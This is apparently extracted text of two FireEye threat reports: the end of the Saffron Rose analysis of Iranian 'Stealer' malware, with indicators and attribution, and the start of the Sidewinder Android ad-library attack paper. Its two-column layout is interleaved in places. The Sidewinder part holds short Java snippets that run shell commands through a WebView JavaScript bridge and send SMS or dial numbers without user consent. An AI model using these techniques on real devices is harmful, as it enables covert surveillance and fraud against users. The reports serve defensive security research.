AppTransferWiz . DLL using a file from the FTP             • 	    Extracts installed proxy software
server “ sqlite3.dll ” , as well as a global atom                configuration information
“ SQLiteFinish ” . IntelRS.exe waits in an indefinite
loop , until AppTransferWiz . DLL defines this state .       • 	    Harvests data from installed cookies
Once the state is set , IntelRS.exe proceeds to           IntelRS.exe loads a Delphi component called
collect data from various areas in the system as         DelphiNative . DLL , which implements some
described below :                                         additional data theft functionality for the following :
• 	     Collects system information : hostname ,             • 	    Internet Explorer ( IE ) accounts
username , timezone , IP addresses , open ports ,
installed applications , running processes , etc .    • 	    Remote Desktop Protocol ( RDP ) accounts
• 	     Performs key logging                               • 	    Browser URLs
Figure 4 : AppTransferWizard .
dll creates sqlite3.dll and
global atom
Figure 5 : IntelRS.exe sleeps
until global atom is set and
sqlite3.dll is present
7 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
The Stealer component uses common techniques                       Analysis of the malware indicates that the data is
to acquire credential data . For instance , it loads                 encrypted via a Rijndael cipher implementation ;
vaultcli . DLL and uses various APIs shown below to                  more specifically it uses AES which is a specific set
acquire RDP accounts from the Windows vault .                       of configurations of Rijndael . It uses a key size of
256 bytes and block size of 128 bytes , which
Harvested data is encrypted and written to disk on                 conforms to the FIPS-197 specification of
the local host . The filenames for these encrypted                  AES-256.21 It utilizes the passphrase ‘ HavijeBaba’
files follow this naming scheme :                                   and a salt of ‘ salam!*%#’ as an input to PBKDF2
( Password - Based Key Derivation Function 2 ) to
{ stolen data type}_{victim system name } _                           derive the key and initialization vector for the
YYYYMMDD_HHMM.Enc                                                  encryption.22 This key derivation implementation in
.NET is done using the Rfc2898DeriveBytes
The { stolen data type } parameter indicates where                   class.23 The passphrase and salt are Persian
the data was harvested from ( e.g. , a Web browser ,                  language words . “ Havij ” means “ carrot ” , “ Baba ”
an instant messenger application , installed proxy                  means “ father ” , and “ Salam ” is a common greeting
software ) .                                                         that means “ Peace ” .
Figure 6 : Acquiring RDP
Accounts
21
ShawnFa . “ The Differences Between Rijndael and AES ” . October 2006 .
22
Wikipedia . “ PBKDF2 ” .
23
Microsoft . “ Rfc2898DeriveBytes Class ” .
8 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Sample Timeline                                         Spoofed Installers
We identified 17 droppers during this research ,         Many of the malicious executables ( droppers ) that
including :                                              we collected were bundled with legitimate
installers for VPN or proxy software . Examples
• 	     9 samples compiled on 2013 - 02 - 17 07:00            include :
• 	     4 samples compiled on 2009 - 07 - 13 23:42            • 	    6dc7cc33a3cdcfee6c4edb6c085b869d was
bundled with an installer for Ultrasurf Proxy
• 	     3 sample compiled on 2013 - 10 - 14 06:48                  software .
• 	     1 sample compiled on 2013 - 10 - 13 09:56             • 	    3d26442f06b34df3d5921f89bf680ee9 was
bundled with an installer for Gerdoovpn
The 2009 compile time appears to have been                   virtual private network software .
forged , while the 2013 compile times may be
legitimate .                                             • 	    3efd971db6fbae08e96535478888cff9 was
bundled with an installer for the Psiphon
In some cases , we found an implant but not the               proxy .
parent dropper . In total , 22 of the 23 implants that
we identified during our research had unique            • 	    288c91d6c0197e99b92c06496921bf2f was
compile times ranging from 2013 - 10 - 29 until                  bundled with an installer for Proxifier
2014 - 03 - 15 . We identified two implants that were             software .
both compiled on 2014 - 3 - 15 at 23:16 . These
compile times appear to be legitimate and coincide      These droppers were also designed to visually
with attempted intrusion activity attributed to         spoof the appearance of the above applications .
these attackers .                                        These droppers contained icons used in the
legitimate installers for these programs .
Figure 7 : Icon for the Psiphon
Anti - censorship Tool
9 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Process Debug ( PDB ) Strings
Analysis of the PDB strings seen in the implants       VS_VERSION_INFO
indicates that there may be more than one              VarFileInfo
developer working on the source code for the           Translation
Stealer builder . The following two PDB paths were      StringFileInfo
seen in the collection of implants that we             000004b0
collected :                                             Comments
Process for Windows
• 	     d:\svn\Stealer\source\Stealer\Stealer\obj\       CompanyName
x86\Release\Stealer.pdb
Microsoft
FileDescription
• 	     f:\Projects\C#\Stealer\source\Stealer\
Process for Windows
Stealer\obj\x86\Release\Stealer.pdb
FileVersion
These strings indicate that the Stealer source         1.0.0.0
code was stored in two different paths but not         InternalName
necessarily on two different computers . The f:\        Stealer.exe
Projects\ path may be from an external storage         LegalCopyright
device such as a thumb drive . It is therefore          Copyright
possible that only one person has access to the           2013
source code , but keeps a separate repository on        OriginalFilename
an external storage device . Alternatively , the         Stealer.exe
different file paths could be the result of two
ProductName
different actors storing their source code in two
Process for Windows
different locations .
ProductVersion
Builder Artifacts                                      1.0.0.0
In nine of the implants that we collected , we found    Assembly Version
a consistent portable executable ( PE ) resource         1.0.0.0
with a SHA256 of
5156aca994ecfcb40458ead8c830cd66469d5f5
a031392898d323a8d7a7f23d3 . This PE
resource contains the VS_VERSION_INFO . In
layman ’s terms , this can best be described as the
metadata describing the executable file . This
specific PE resource contained the
following information :
Note the InternalName of ‘ Stealer.exe’. This is the
attackers’ name for this malware family .
10 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
The “ Stealer ” Builder and Tools                              The Builder option enables an attacker to
During our research , we recovered two different              configure a new Stealer backdoor . The user can
tools used by the members of the Ajax Security               configure the new backdoor to connect to a
Team in conjunction with targeted intrusion                  specific CnC server with a personalized username
activities . The first tool , labeled the ‘ Stealer Builder’    and password . The attacker can bind the backdoor
was compiled on 2014 - 04 - 08 . This compile date                to a legitimate application of his or her choosing , or
may indicate that the group is still active .                 they can cloak it with an icon designed to make the
backdoor appear as though it is a legitimate file .
Upon executing the ‘ Stealer Builder’ the user is             We also noted that the Builder did not allow the
presented with an option to load the ‘ Builder’ or to         attacker to select a new passphrase or salt used to
‘ Decrypt’ logs generated from a victim and                   encrypt the stolen data . The passphrase
exfiltrated to a command - and - control ( CnC ) server            ‘ HavijeBaba’ and a salt of ‘ salam!*%#’ are both
under the groups’ control .                                   hardcoded into the builder .
Figure 8 : The Stealer Tool
Figure 9 : The Stealer Builder
11 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
During testing , we observed that backdoors             Base64 encoded text into plaintext . Members of
generated by this Stealer Builder had a timestamp      the Ajax Security Team likely this use tool to
of 2013 - 12 - 19 . We had one backdoor in our              encode the configuration data seen in
repository with this same timestamp . This sample       RapidStartTech.stl files . As noted above , the
RapidStartTech.stl contains the backdoor ’s FTP
( MD5 1823b77b9ee6296a8b997ffb64d32d21 )                 credentials , implant name , decoy name , and
was configured to exfiltrate data to ultrasms[.]ir .    screenshot interval , along with boolean settings for
The VS_VERSION_INFO PE resource mentioned              startup , keylogger , and screenshot plugins .
above ( SHA256
5156aca994ecfcb40458ead8c830cd66469d5f5                Encoding and decoding Base64 data is a
a031392898d323a8d7a7f23d3 ) is an artifact of           straightforward task and the standard Linux
the Stealer builder that we recovered . The builder     operating system offers a number of command line
generates an executable named IntelRapidStart .         tools to achieve this task . The presence of a
exe . This executable contains the aforementioned       Windows - based GUI tool that simplifies encoding
VS_VERSION_INFO PE resource .                           and decoding Base64 data indicates that these
tools may have been developed for less adept
We also recovered a tool designed to encode            users .
plaintext into Base64 encoded text or decode
Figure 10 : Base64 Encoder
12 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Command - and - Control Infrastructure                     The website used in the Aerospace Conference
The CnC infrastructure consists of distinct , but       attack was aeroconf2014[.]org , which is registered
linked , clusters that have targeted both the users     to info@usa.gov[.]us . However , historical WHOIS
of anti - censorship tools in Iran as well as defense    information shows that the domain was registered
contractor companies in the U.S.                       by keyvan.ajaxtm@gmail[.]com—the same domain
used to register ajaxtm[.]org , the website of the
The first cluster contains the domain used in the      Ajax Security Team . The same email addresses
Aerospace Conference attack as well as the             were used to register variations of domain names
domains used in phishing attacks designed to           associated with popular services provided by
capture user credentials :                              companies such as Google , Facebook , Yahoo and
LinkedIn .
Figure 11 : Ajax Security
Team ’s Phishing
Infrastructure
13 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
The second cluster comprises the CnC                   domains registered by osshom@yahoo[.]com , many
infrastructure used in the anti - censorship attacks .    of which are consistent with the pattern of
The majority of the samples we analyzed connect        registering domains with associations to Google
to intel - update[.]com and update - mirror[.]com ,         and Yahoo services . We also observed crossover
which were registered by james.mateo@aim[.]com .        with a sample that connected to both intel-
The domain intel - update[.]com resolved to the IP       update[.]com and ultrasms[.]ir , which was
address 88.150.227.197 , which also hosted              registered by lvlr98@gmail[.]com .
Figure 12 : Ajax Security
Team ’s Stealer CnC
Infrastructure
Figure 13 : Overlap between the
phishing and stealer clusters
14 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
These two clusters are linked by a common IP             found that the majority had either their timezone
address ( 5.9.244.151 ) , which is used by both ns2 .        set to “ Iran Standard Time ” or had their language
aeroconf2014[.]org and office.windows-                   setting set to Persian :
essentials[.]tk .
• 	     44 had their timezone set to “ Iran Standard
A third cluster of activity was found via analysis of          Time ” ( 37 of those also have their language set
1d4d9f6e6fa1a07cb0a66a9ee06d624a . This                         to Persian )
sample is a Stealer variant that connects to the
aforementioned intel - update[.]com as well as             • 	     Of the remaining 33 , 10 have Persian
plugin - adobe[.]com . The domain plugin - adobe[. ]                 language settings
com resolved to 81.17.28.235 . Other domains
seen resolving to IP address nearby include the          • 	     12 have either Proxifier or Psiphon installed
following :                                                     or running ( all 12 had a Persian language
setting and all but one had their timezone set
Aside from the sample connecting to plugin-                    to “ Iran Standard Time ” )
adobe[.]com , we have not discovered any malware
connecting to these domains .                             The largest concentration of victims is in Iran ,
based on the premise that Persian language
Victimology                                              settings and “ Iran Standard Time ” correlate the
During our investigation , we were able to recover        victim to be geographically located in Iran . As such ,
information on 77 victims from one CnC server            we believe that attackers disguised malware as
that we discovered while analyzing malware               anti - censorship tools in order to target the users of
samples that were disguised as anti - censorship           such tools inside Iran as well as Iranian dissidents
tools . While analyzing the data from the victims , we     outside the country .
Domain                           IP                           First Seen                   Last Seen
yahoomail.com.co                 81.17.28.227                 2013 - 11 - 28                   2014 - 4 - 10
privacy-google.com               81.17.28.229                 2014 - 02 - 14                   2014 - 02 - 23
xn--google-yri.com               81.17.28.229                 2013 - 12 - 08                   2014 - 01 - 15
appleid.com.co                   81.17.28.231                 2014 - 02 - 20                   2014 - 02 - 20
accounts-apple.com               81.17.28.231                 2013 - 12 - 31                   2014 - 02 - 20
users-facebook.com               81.17.28.231                 2014 - 01 - 15                   2014 - 01 - 15
xn--facebook-06k.com 81.17.28.231                            2013 - 11 - 27                   2014 - 03 - 07
15 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Attribution                                                                       several exploits for content management systems
The Ajax Security Team appears to have been                                       and engaged in defacements.25 Initially , the
formed by personas named “ HUrr!c4nE ! ” and                                         defacements seemed to be motivated by a desire
“ Cair3x ” in 2010.24 Both members were engaged in                                  to demonstrate the group ’s prowess — they even
website defacements prior to the forming of the                                   defaced an Iranian government website.26
Ajax Security Team , and both were members of
Iranian hacker forums such as ashiyane[.]org and                                  However , the group appears to have become
shabgard[.]org . Other members include “ 0day ” ,                                     increasingly political . For example , in a blog post in
“ Mohammad PK ” and “ Crim3r ” . The Ajax Security                                     2012 , “ Cair3x ” announced the targeting of Iran ’s
Team website at ajaxtm[.]org had a Web forum                                      political opponents .
with at least 236 members . The group published
Figure 14 : Cair3x ’s original
blog post and translation
Hacking anti - revolution political and opposition websites
Hello to everyone , After a while of operating underground
and enhancing our company ’s projects and getting close to
24 June 2012 , and the martyrdom of Ayatollah Dr. Beheshti
and 72 of Imam Khomeini ’s ( First and Former supreme
leader of Iran ) followers , we have planned a project/
initiative to attack anti - revolution and political
websites against the Islamic Republic . And in late hours
of Wednesday , June 24 , 2012 , we attacked these websites
and defaced them by writing the words “ We are young but
we can ” on their websites . This is so the enemies of this
country know that the blood of our martyr will never be
in vain and they will always be remembered in the heart
of gallant Iranians .
24
By March 2010 HUrr!c4nE ! was identifying as a member of Ajax Security Team in exploit releases http://www.exploit-db.com/exploits/17011/ and the
first defacement archived by Zone - H , which lists both HUrr!c4nE ! and Cair3x as members was December 2010 http://www.zone-h.org/mirror/
id/12730879
25
http://osvdb.org/affiliations/1768-ajax-security-team http://www.exploit-db.com/author/?a=3223 http://packetstormsecurity.com/files/author/9928/
26
http://www.zone-h.org/mirror/id/13225183
16 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
In 2013 , the Ajax Security Team , and “ HUrr!c4nE ! ”                                   “ HUrr!c4nE ! ” has the most open / documented
in particular , took part in “ # OpIsrael ” and                                         Internet persona of the Ajax Security Team . He
“ # OpUSA”.27                                                                         registered the ajaxtm[.]org domain name using the
email address keyvan.ajaxtm@gmail[.]com . This
By early 2014 , the Ajax Security Team appears to                                    was also the email address used to register the
have dwindled . There have been no defacements                                       domain aerospace2014[.]org , which was used in
since December 2013 . The website and forum at                                       spear phishing attacks against companies in the
ajaxtm[.]org operated by “ HUrr!c4nE ! ” , aka                                          U.S. and is linked with malware activity directed at
“ k3yv4n ” , is no longer active .                                                      users of anti - censorship tools in Iran .
Figure 15 : Screenshot of the
defacement content used in
# OpUSA
27
Ashraf , N. “ # OpIsrael : Hacktivists Starting Cyber Attack against Israel on 7th of April ” . March 2013 . “ OpUSA Targeting Government & Financial Sectors on
07 May 2013 : Likely Tools , Targets and Mitigating Measures ” . May 2013 .
17 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
“ HUrr!c4nE ! ” features prominently in all the                                         For example , the Ajax Security Team could just be
group ’s activities and defacements . Although there                                   using anti - censorship tools as a lure because they
has been a decline in public - facing Ajax Security                                    are popular in Iran , in order to engage in activities
Team activity , this coincides with an increase in                                    that would be considered traditional cybercrime . In
malware activity linked to the group ’s                                               one case , “ HUrr!c4nE ! ” , using the email address
infrastructure .                                                                      keyvan.ajaxtm@gmail[.]com , has been flagged for
possible fraud by an online retailer . While
• ~2009—Membership in ashiyane.org and                                               “ HUrr!c4nE ! ” is engaged in operations that align
shabgard.org forums                                                                  with Iran ’s political objectives , he may also be
dabbling in traditional cybercrime .
• 2010 – 2012—Defacements , Release of exploits
for CMS                                                                              This indicates that there is a considerable grey area
between the cyber espionage capabilities of Iran ’s
• 2012 – 2013—Increasing politicization ,                                             hacker groups and any direct Iranian government
participation on # OpIsrael , # OpUSA                                                   or military involvement .
• 2013 – 2014—Transition to cyber - espionage                                          On the spectrum of state responsibility , these
attacks align with state - encouraged attacks , which
The increasing politicization of the Ajax Security                                   are defined as attacks in which :
Team aligns with the timing of their activities
against the perceived enemies of Iran . In addition                                   Third parties control and conduct the attack , but
to attacking companies in the U.S. , they have                                        the national government encourages them as a
targeted domestic users of anti - censorship                                           matter of policy.28
technology .
Recruiting hackers through this model allows Iran
While the objectives of this group are consistent                                    to influence their activities , and provides the
with Iran ’s efforts at controlling political dissent                                 Iranian government plausible deniability , but a lack
and expanding offensive cyber capabilities , the                                      of direct control also means that the groups may be
relationship between this group and the Iranian                                      unpredictable and engage in unsanctioned attacks .
government remains inconclusive .
Figure 16 : Screenshot
of an online retailer ’s
fraud alert
28
Healey , J. “ Beyond Attribution : Seeking National Responsibility for Cyber Attacks ” . January 2012 .
18 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Conclusion                                                About FireEye
The increased politicization of the Ajax Security         FireEye has invented a purpose - built , virtual
Team , and the transition from nuisance                    machine - based security platform that provides
defacements to operations against internal                real - time threat protection to enterprises and
dissidents and foreign targets , coincides with            governments worldwide against the next
moves by Iran aimed at increasing offensive cyber         generation of cyber attacks . These highly
capabilities . While the relationship between actors       sophisticated cyber attacks easily circumvent
such as the Ajax Security Team and the Iranian            traditional signature - based defenses , such as
government is unknown , their activities appear to         next - generation firewalls , IPS , anti - virus , and
align with Iranian government political objectives .       gateways . The FireEye Threat Prevention Platform
provides real - time , dynamic threat protection
The capabilities of the Ajax Security Team remain         without the use of signatures to protect an
unclear . This group uses at least one malware             organization across the primary threat vectors and
family that is not publicly available . We have not        across the different stages of an attack life cycle .
directly observed the Ajax Security Team use
exploits to deliver malware , but it is unclear if they    The core of the FireEye platform is a virtual
or other Iranian actors are capable of producing or       execution engine , complemented by dynamic
acquiring exploit code .                                   threat intelligence , to identify and block cyber
attacks in real time . FireEye has over 1,500
While the Ajax Security Team ’s capabilities remain        customers across more than 40 countries ,
unclear , we know that their current operations            including over 100 of the Fortune 500 .
have been somewhat successful as measured by
the number of victims seen checking into to an Ajax
Security Team controlled CnC server . We believe
that if these actors continue the current pace of
their operations they will improve their capabilities
in the mid - term .                                          We thank Kenneth Geers and Jen Weedon for their support and analysis on
these findings .
FireEye , Inc. | 1440 McCarthy Blvd . Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( 347.3393 ) | info@fireeye.com | www.fireeye.com
© 2014 FireEye , Inc. All rights reserved . FireEye is a registered trademark of FireEye ,
Inc. All other brands , products , or service names are or may be trademarks or service
marks of their respective owners . – RPT.OSR.EN - US.082014
19 www.fireeye.com

REPORT
SIDEWINDER
TARGETED ATTACK
AGAINST ANDROID
IN THE GOLDEN
AGE OF AD
LIBRARIES
SECURITY
REIMAGINED
FireEye : Sidewinder Targeted Attack against Android
CONTENTS
Introduction ................................................................................................................................................................................................................................................................................................................................................ 3
Sidewinder Targeted Attack Overview ............................................................................................................................................................................................................................. 3
Warhead : Attacking Vulnerabilities of Android ........................................................................................................................................................................................ 5
Piercing The Armor ................................................................................................................................................................................................................................................................................................. 5
Detonation without Android Context .................................................................................................................................................................................................................... 7
Detonation with Android Context ................................................................................................................................................................................................................................... 8
Targeting Victims Based on Ad Traffic ............................................................................................................................................................................................................................ 11
Communication Channels Prone to Hijack .......................................................................................................................................................................................... 11
Information Leakage from Ad Libraries ....................................................................................................................................................................................................... 11
Large - scale Monitoring and Precise Hijacking ........................................................................................................................................................................... 12
Targetable and Exploitable Google Play Apps ......................................................................................................................................................................................... 13
Conclusion ................................................................................................................................................................................................................................................................................................................................................. 20
2 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
Introduction                                                                      Finally , we show that this threat is not only real
By 2014 , the number of Android users has                                          but also prevalent due to the popularity of
grown to 1.1 billion and the number of Android                                    Android ad libraries . We hope this paper
devices has reached 1.9 billion1 . At the same                                     kickstarts the conversation on how to better
time , enterprises are also embracing Android-                                     protect the security and privacy in third - party
based Bring Your Own Device ( BYOD ) solutions .                                     libraries and how to further harden the Android
For example , in Intel ’s BYOD program , there are                                   security framework in the future .
more than 20,000 Android devices across over
800 combinations of Android versions and
hardware configurations2 .
Sidewinder Targeted Attack Overview
Although little malware has been found in Google                                  To understand the security risks brought by a
Play , both Android apps and the Android system                                    Sidewinder Targeted Attack , we first explain one
itself contain vulnerabilities . Aggressive ad                                     possible attack mechanism ( illustrated in Figure 1 )
libraries also leak the user ’s private information .                               that is similar to that of Sidewinder missiles . The
By leveraging all these vulnerabilities , an attacker                              attacker can hijack the network where the
can conduct more targeted attacks , which we call                                  targeted victim resides . Like an infrared homing
“ Sidewinder Targeted Attacks . ” In this paper we                                   system , the attacker then seeks “ emission ” from ad
explain the security risks from such attacks , in                                  libraries running on the target device to track and
which an attacker can intercept and use private                                   lock on it . Once the target is locked on , the
information uploaded from ad libraries to                                         attacker can launch advanced persistent attacks .
precisely locate targeted areas such as a CEO ’s                                   To minimize detection chances , the attacker can
office or specific conference rooms . When the                                     choose to take action on important targets only ,
target is identified , a “ Sidewinder Targeted Attack ”                              ignoring all other devices . In later sections , we
exploits popular vulnerabilities in ad libraries , such                            discuss attacking ( “ warhead ” ) and targeting
as Javascript - binding - over - HTTP or dynamic-                                       ( “ homing ” ) components in detail and show how a
loading - over - HTTP , etc .                                                           combination of these components can launch
powerful and precise attacks on target devices .
It is a well - known challenge for an attacker to call
Android services from injected native code that                                   Table 1 proposes different attacks that an
does n’t have Android application context . Here ,                                   attacker can launch remotely on target devices
we explain how attackers can invoke Android                                       through vulnerable ad libraries . Figure 2 shows a
services for tasks including taking photos , calling                               proof - of - concept attack control interface . This
phone numbers , sending SMS , reading from/                                         attack targets one of the ad libraries described in
writing to the clipboard , etc . Furthermore , the                                   this paper . The security risks become obvious by
attackers can exploit several Android                                             looking at what the attacker can do with this
vulnerabilities to get valuable private information                               control interface . The left panel enables the
or to launch more advanced attacks .                                               attacker to command the victim 's device ,
1
Ranjit Atwal , Lillian Tay , Roberta Cozza , Tuong Huy Nguyen , Tracy Tsai , Annette Zimmermann , and CK Lu . Forecast : Pcs , ultramobiles and mobile phones ,
worldwide , 2010 - 2017 , 4q13 update . Gartner , 2013 .
2
Rob Evered , Steve Watson , Paul Dockter , and Derek Harkin . Android devices in a byod environment . Intel White Paper , 2013 .
3 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
including uploading local files , taking pictures ,                  installed app list , clipboard , a photo taken from
recording audio / video , manipulating the                            the back camera , an audio clip , and a video clip
clipboard , sending SMS , dialing numbers ,                           have been uploaded , with the GPS location
implanting bootkit , or installing the attacker ’s                   intercepted from the ad library . The panel also
apps uploaded to Google Play , etc . The right                       pins down the GPS location of the victim ’s
panel lists all information stolen from the                        device onto a Google Map widget .
victim ’s device . In this screenshot , the victim ’s
Figure 1 :
Illustration of
the Sidewinder
Info uploaded from ad libs
Targeted Attack
Scenario
Attack Overview                                                                                         Serving Normal ad
Injecting attack payload
Comman & Control
Device A
Device
Victim
Device B                                Attacker ’s                          Actual
Server                           Ad Server

Table 1 : Outline                      API Level                                         ≤ API 16                                       > API 16
of the Sidewinder
Targeted                             Attack Vector                                JBOH and DLOH                                       JS Sidedoor
Attack through                      31.08%                      ( w/ Android Context )          ( w / o Android Context )
Vulnerable Ad                                                                                        51.04%               48.96%
Libraries
68.92%    Clipboard manipulation        Local files uploading Root
Launcher settings           exploit & Code injection              Abusing privileged
Attacks
modification Proxy                                                   interfaces
modification             Implanting bootkit Sending
SMS Making phone calls
Taking pictures Audio &
video recording Stealthy
app installation
4 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
Based on this precise position information , it is easy to identify individuals or groups of “ VIP ” targets by
which offices they are in .
Figure 2 : The
control panel of
the attacker , and
the files uploaded
from the victim
Warhead : Attacking Vulnerabilities                                              ( Android 4.1 ) or below . As noted by Google : “ Use
of Android                                                                      of this method in a WebView containing
untrusted content could allow an attacker to
Piercing The Armor                                                              manipulate the host application in unintended
In this section , we explain in more detail the risks                            ways , executing Java code with the permissions
of remote attacks on the Android devices .                                       of the host application.”3
Attacking JavaScript Binding over                                               In particular , if an app running on Android API 16
HTTP ( JBOH )                                                                     or below uses the JavaScript binding method
Android uses the JavaScript binding method                                      addJavascriptInterface and loads the content
addJavascriptInterface to enable JavaScript                                     in the WebView over HTTP , an attacker over the
code running inside a WebView to access the                                     network could hijack the HTTP traffic ( e.g. ,
app ’s Java methods ( also known as the Javascript                                through WiFi or DNS hijacking ) to inject
bridge ) . However , it is widely known that this                                  malicious content into the WebView and to
feature , if not used carefully , presents a potential                            control the host application . Listing 1 is a sample
security risk when running on Android API 16                                    Javascript snippet to execute shell command .
3
http://developer.android.com/reference/android/webkit/WebView.html # addJavascriptInterface(java.lang . Object,%20java.lang . String ) .
5 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
Figure 3 : Target
SDK statistics of
popular Google
Play apps                         31.08%                                         API < = 16                                                          API < = 16
API > = 16                           51.04%                 48.96%    API > 16
68.92%
( a ) Statistics by app number                                                      ( b ) Statistics by app download count
Listing 1 : Sample
Javascript snippet             jsObj.getClass().forName(”java.lang . Runtime ” )
to execute shell              	 .getMethod(”getRuntime”,null).invoke(null , null).exec(cmd )
command
We call this the JavaScript - Binding - Over - HTTP                                     Attacking Annotated JavaScript
( JBOH ) vulnerability4 . This applies to insecure                                   Binding Interfaces
HTTPS channels as well . If an app containing such                                 Starting with Android 4.2 ( API>16 ) , Google
vulnerability has sensitive Android permissions                                   introduced the @JavascriptInterface
such as access to the camera , a remote attacker                                   anno- tation6 to explicitly designate and restrict
could exploit it to perform sensitive tasks such as                               which public Java methods in the app were
taking photos or recording video , over the                                        accessible from JavaScript running inside
Internet , without consent . Based on the official                                  a WebView . However , if an ad library uses the
data in June 20145 , ~60% of Android devices are                                   @JavascriptInterface annotation to expose
still running API≤16 .                                                             security - sensitive interfaces , and uses HTTP to
load content in the WebView , it is vulnerable to
Note that API>16 platforms are not necessarily                                    attacks where an attacker over the network
secure . If the app is targeting at a lower API                                    could inject malicious content into the WebView
level , Android will still run it with the lower API                               to misuse the interfaces exposed through the JS
level for compatibility reasons . Figure 3 shows                                   binding annotation . We call these exposed JS
the targeted API of popular Google Play apps ,                                     binding annotation interfaces “ JS Sidedoors . ”
each of which has over 50,000 downloads . We
can see that a large portion of apps are                                          For example , we found a list of sensitive
targeting at API≤16 .                                                              Javascript interfaces that are publicly ex- posed
from certain versions of a real - world ad library :
4
http://www.fireeye.com / blog / technical/2014/01/js - binding - over - http- vulnerability-and-javascript-sidedoor.html .
5
https://developer.android.com/about/dashboards/index.html .
6
http://developer.android.com/reference/android/webkit/ JavascriptInterface.html .
6 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
createCalendarEvent , makeCall ,                                            functionalities , especially remote call invocations ,
postToSocial , sendMail , sendSMS ,                                          are encapsulated in the context . We discuss
takeCameraPicture , getGalleryImage ,                                       attacks requiring context in a later section . In this
registerMicListener , etc4 . Given that this ad                             section , we explain attacks that do n’t need
library loads ads using HTTP , if the host app has                         Android context , and discuss their security risks .
the corresponding permissions ( e.g. , CALL
PHONE ) , attackers over the network can abuse                              Root Exploits and Code Injection
these interfaces to do malicious things ( e.g. ,                            One direct threat posed by JBOH is to use the
utilizing the makeCall interface to dial phone                            JBOH shell ( Listing 1 ) to download exe- cutables
numbers without the user ’s consent ) .                                      and use them to root the device . Commercial
one - touch root apps claim they can root more
Security Issues with DEX Loading over                                     than 1,000 brands ( > 20,000 models ) 8 .
HTTP ( DLOH )                                                               towelroot 9 , which exploits a bug found
Similar to JBOH , DEX loading over HTTP or                                 recently in Linux kernel , claims that it can root
insecure HTTPS ( DLOH ) is another serious issue                            most new devices released before June 2014 .
raised by ad libraries . If the attackers can hijack                       Thus , as long as attackers can get the JBOH shell ,
the communication channels and inject malicious                           they have the tools to obtain root on most
DEX files , they can then control the behaviors of                         Android phone models .
the victim apps .
Even if the attackers ca n’t obtain root , they can
Detonation without Android Context                                        attempt ptrace 10 to control the host app .
After getting local access , the attacker can upload                       Although only processes with root privilege can
private and sensitive files from the victim ’s device ,                     ptrace others , child processes are able to
or modify files that the host app can write to ( e.g. ,                     ptrace their parents . Because the shell
the directory of the host app and SD Card with                            launched from the Javascript bridge is a child
FAT file system ) .                                                         process of the host app , it can ptrace the host
app ’s process . Note that only apps with
To launch more sophisticated attacks like sending                         android : debuggable set as “ true ” in the manifest
SMS or taking pictures , the attackers may use                             can be ptraced , which limits its adoption .
Java reflection to call other APIs from the
Javascript bridge . It appears this method makes                           Sending SMS and Dialing Numbers without
sending SMS easy . However , some other                                     User Consent
operations require Android context 7 or                                   Sending SMS does not require context or user
registering Java callbacks . Android context                               interaction . A simple call does the job , as
provides an interface to the global information                           shown in Listing 2
about an app ’s environment . Many Android
Listing 2 : Sending
SMS without user              SmsManager.getDefault().sendTextMessage(phoneNumber , null , message , null , null ) ;
consent
7
http://developer.android.com/reference/android/content/Context.html .
8
http://shuaji.360.cn / root/.
9
http://towelroot.com/.
10
http://linux.die.net/man/2/ptrace .
7 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
To make calls from the Javascript bridge                                        Javascript bridge . Code in Listing 4 , for
without user consent , we can invoke the                                         example , is an easy way to get context from
telephony service to dial numbers directly via                                  anywhere of the application .
binder , as shown in Listing 3 , where phone is
the remote Android telephony service and the                                    Operations like taking pictures and recording
number 2 represents the second remote call .                                     videos need to register Java callbacks . The
s16 is the type marker represents “ 16 bit                                       attackers either need to boot a Java VM from
string , ” and packageName is the host app ’s                                      the Javascript bridge , or to inject code into
package name , where we can obtain from the                                      the host app ’s Java VM .
information posted from the ad libraries . The
sequence number of the remote calls can be                                      Fortunately , Android Runtime offers another
found in the corresponding Android Interface                                    way to load Java Native Interface ( JNI ) code
into the host app using Runtime.load ( ) . As
Definition Language ( AIDL ) files 11 . Many other                                 shown in Listing 5 , an attacker can load
Android services can be invoked in the same                                     executables compiled from JNI code . Once
way , including sending SMS                                                      loaded , the code can obtain context as described
in Listing 4 , or call DexClassLoaderload12 to
Detonation with Android Context                                                 inject new classes from the attackers’ DEX
As mentioned , it is more convenient to                                          files to register callbacks to take pictures/
directly obtain the Android context via the                                     record videos .
Listing 3 : Dial
numbers without                Runtime.getRuntime ( )
user consent                  	    .exec(”service call phone 2 s 16 ” + packageName + ” s16 ” + phoneNumber ) ;
Listing 4 : Sample
code to obtain                 // We omit all try−catch statements and other unimportant code in this paper
context
public ContextgetContext ( ) {
finalClass<?>activityThreadClass = Class
.forName(”android.app ActivityThread ” ) ;
finalMethodmethod = activityThreadClass
.getMethod(”currentApplication ” ) ;
return(Application)method.invoke(null,(Object[])null ) ;
}
http://developer.android.com/guide/components/aidl.html .
11
http://developer.android.com/reference/dalvik/system/DexClassLoader . html .
12
8 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
There are other ways to obtain Android context ,                                Using these APIs , the attackers can monitor
like reflecting to the private static context                                  changes to a clipboard and transfer the
variable of WebView13 . However , without Java                                   clipboard contents to some remote server .
VM instances , it ’s difficult to take pictures and                              They can also alter the clipboard content to
record videos . After our submission to Black Hat                               achieve phishing goals . For example , the user
in April 2014 , we noticed that MWR was also                                    may copy a link to visit and the background
concurrently and independently working on this                                 malicious service can change that link to a
issue . They published a similar mechanism in                                   phishing site . We have notified Google about
June 201414 .                                                                   this issue .
Clipboard Monitoring nd Tampering                                              Launcher Settings Modification
With the Android context , an attacker can                                      Android Open Source Project ( AOSP ) classifies
